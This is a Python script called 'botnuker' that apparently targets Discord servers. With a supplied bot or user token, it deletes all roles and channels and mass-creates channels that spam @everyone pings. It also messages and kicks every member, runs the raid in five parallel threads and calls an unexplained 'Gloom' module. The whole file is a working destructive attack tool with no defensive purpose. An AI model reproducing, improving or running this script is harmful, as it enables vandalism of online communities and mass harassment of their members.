import time
import httpx
import json as json
import threading
import Gloom

def botnuker():
    def checkToken():  # sourcery skip: raise-specific-error
            session.headers= { "Authorization": token }
            r = session.get('https://discord.com/api/v10/users/@me')
            if r.status_code in list(range(200,300)):
                isBot = False
            else:
                session.headers= { "Authorization": f"Bot {token}" }
                r = session.get('https://discord.com/api/v10/users/@me')
                if r.status_code in list(range(200,300)):
                    isBot = True
                else:
                    raise Exception('Invalid Token')
                    
    session = httpx.Client()
    token = input("Bot Token: ")
    checkToken()
    guildID = input("Server ID: ")
    name = input("Channels/Roles Name: ")
    message = input("Spam Message: ")
    
    def deleteRoles():
            roles = session.get(f'https://discord.com/api/guilds/{guildID}/roles').json()
            for role in roles:
                r = session.delete(f'https://discord.com/api/v6/guilds/{guildID}/roles/{role["id"]}')
                if r.status_code in list(range(200,300)):
                    print(f"Successfully deleted role {role['name']}")
                else:
                    print(f"Failed to delete role {role['name']}")
                
    def delchannel():
        channels = session.get(f"https://discord.com/api/v9/guilds/{guildID}/channels", headers={"Authorization": f"Bot {token}"}).json()
        for channel in channels:
                    s = session.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers={"Authorization": f"Bot {token}"})
                    if s.status_code == 200:
                        print(f"Deleted {channel['id']}")
                    elif "retry_after" in s.text:
                        print("Ratelimited" + s.json()['retry_after'])
                        time.sleep(float(s.json()['retry_after']))
                    elif "Missing Permissions" in s.text:
                        print("Missing Permissions", channel)
    
        pass
    
    def spamchannels():
            for _ in range(100):
                r = session.post(f'https://discord.com/api/v6/guilds/{guildID}/channels',json={"type":0,"name":name,"permission_overwrites":[]})
                if r.status_code in list(range(200,300)):
                    print(f"Successfully created channel {name}")
                    for _ in range(int(5)):
                        session.post(f'https://discord.com/api/v6/channels/{r.json()["id"]}/messages',json={"content":f'@everyone {name}',"tts":False})
                        time.sleep(0)
                else:
                    print("Couldn't create channel")
        
    def DMkickAll():
            members=session.get(f'https://discord.com/api/v6/guilds/{guildID}/members').json()
            for member in members:
                session.post('https://discord.com/api/v6/users/@me/channels',json={"recipients":[member["id"],]}).json() # opens the dm
                session.post(f'https://discord.com/api/v6/channels/{member["id"]}/messages',json={"content":f"@everyone {message}","tts":False})
                time.sleep(1)
                session.delete(f'https://discord.com/api/v6/guilds/{guildID}/members/{member["id"]}')
                print(f"Messaged & Kicked {member['name']}#{member['discriminator']}")
    
    def nuke():
        delchannel()
        deleteRoles()
        spamchannels()
        DMkickAll()
        Gloom.main()
    
    threads = []
    for i in range(int(5)):
        t = threading.Thread(target=nuke)
        t.start()
        threads.append(t)
